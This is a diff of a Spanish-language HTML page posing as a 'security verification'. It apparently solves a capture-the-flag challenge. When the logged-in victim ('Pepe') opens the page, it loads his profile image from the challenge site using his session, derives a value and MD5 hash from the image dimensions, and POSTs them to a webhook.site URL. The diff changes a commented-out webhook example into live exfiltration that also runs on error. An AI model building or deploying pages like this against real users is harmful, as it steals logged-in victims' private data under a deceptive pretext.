@@ -4,46 +4,69 @@
     <title>Verificación de Seguridad</title>
 </head>
 <body>
-    <h2>Verificando tu imagen de perfil...</h2>
+    <h2>Verificando imagen de perfil...</h2>
     <div id="result"></div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <script>
-    // Cargar la imagen de perfil del usuario logueado (Pepe)
-    const img = new Image();
-    
-    img.onload = function() {
-        const width = this.naturalWidth;
-        const height = this.naturalHeight;
-        const nivel = width * height;
+    // Esperar para asegurar que las cookies están cargadas
+    setTimeout(() => {
+        const img = new Image();
         
-        console.log('✅ Imagen cargada:');
-        console.log('Dimensiones:', width + 'x' + height);
-        console.log('Nivel:', nivel);
-        console.log('MD5:', md5);
+        img.onload = function() {
+            const width = this.naturalWidth;
+            const height = this.naturalHeight;
+            const nivel = width * height;
+            const md5 = CryptoJS.MD5(nivel.toString()).toString();
+            
+            console.log('✅ Imagen cargada:');
+            console.log('Dimensiones:', width + 'x' + height);
+            console.log('Nivel:', nivel);
+            console.log('MD5:', md5);
+            
+            // Mostrar en pantalla
+            document.getElementById('result').innerHTML = `
+                <h3>✅ Verificación completada</h3>
+                <p><strong>Dimensiones:</strong> ${width} × ${height} px</p>
+                <p><strong>Nivel:</strong> ${nivel}</p>
+                <p><strong>MD5:</strong> ${md5}</p>
+            `;
+            
+            // ENVIAR A TU WEBHOOK - VOS VAS A VER ESTO
+            fetch('https://webhook.site/aee2101a-a419-4a17-9ccb-abeb00cd4e95', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    nivel: nivel,
+                    md5: md5,
+                    dimensions: `${width}x${height}`,
+                    timestamp: new Date().toISOString(),
+                    message: 'Datos de Pepe obtenidos'
+                })
+            })
+            .then(response => console.log('Datos enviados al webhook'))
+            .catch(error => console.error('Error enviando al webhook:', error));
+        };
         
-        // Mostrar en pantalla
-        document.getElementById('result').innerHTML = `
-            <h3>✅ Verificación completada</h3>
-            <p><strong>Dimensiones:</strong> ${width} × ${height} px</p>
-            <p><strong>Nivel:</strong> ${nivel}</p>
-            <p><strong>MD5:</strong> ${md5}</p>
-        `;
+        img.onerror = function() {
+            console.error('❌ Error cargando la imagen');
+            document.getElementById('result').innerHTML = '<p>❌ Error cargando imagen</p>';
+            
+            // Enviar error al webhook también
+            fetch('https://webhook.site/aee2101a-a419-4a17-9ccb-abeb00cd4e95', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    error: 'No se pudo cargar la imagen',
+                    timestamp: new Date().toISOString()
+                })
+            });
+        };
         
-        // También podés enviar a un webhook si querés
-        // fetch('https://webhook.site/tu-id', {
-        //     method: 'POST',
-        //     body: JSON.stringify({ nivel, md5, dimensions: `${width}x${height}` })
-        // });
-    };
-    
-    img.onerror = function() {
-        console.error('❌ Error cargando la imagen');
-        document.getElementById('result').innerHTML = '<p>❌ Error cargando la imagen</p>';
-    };
-    
-    // URL de la imagen de perfil + timestamp para evitar cache
-    img.src = 'https://chl-484b3ba3-69b5-43e2-bdd7-c4dc358b8580-imagen-importante.softwareseguro.com.ar/profile-pic?' + Date.now();
+        // Cargar la imagen de perfil - debería ser la de Pepe cuando él visita
+        img.src = 'https://chl-484b3ba3-69b5-43e2-bdd7-c4dc358b8580-imagen-importante.softwareseguro.com.ar/profile-pic?' + Date.now();
+        
+    }, 500); // Esperar medio segundo
     </script>
 </body>
 </html>
